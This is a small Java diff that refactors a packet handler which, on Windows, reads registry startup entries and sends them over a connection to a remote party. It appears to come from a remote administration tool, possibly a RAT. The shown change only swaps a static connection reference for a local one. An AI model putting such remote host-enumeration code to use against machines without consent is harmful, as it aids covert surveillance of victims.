@@ -23,14 +23,14 @@ public class Packet78RegistryStartup extends AbstractIncomingPacket {
 				while ((line = reader.readLine()) != null) {
 					String[] args = line.trim().split("    ");
 
-					Connection.instance.addToSendQueue(new Packet53RegistryStartup(args));
+					con.addToSendQueue(new Packet53RegistryStartup(args));
 				}
 				reader.close();
 			} else {
 				throw new Exception("Windows only");
 			}
 		} catch (Exception ex) {
-			Connection.instance.addToSendQueue(new Packet53RegistryStartup("Error: " + ex.getClass().getSimpleName() + ": " + ex.getMessage()));
+			con.addToSendQueue(new Packet53RegistryStartup("Error: " + ex.getClass().getSimpleName() + ": " + ex.getMessage()));
 		}
 	}
 
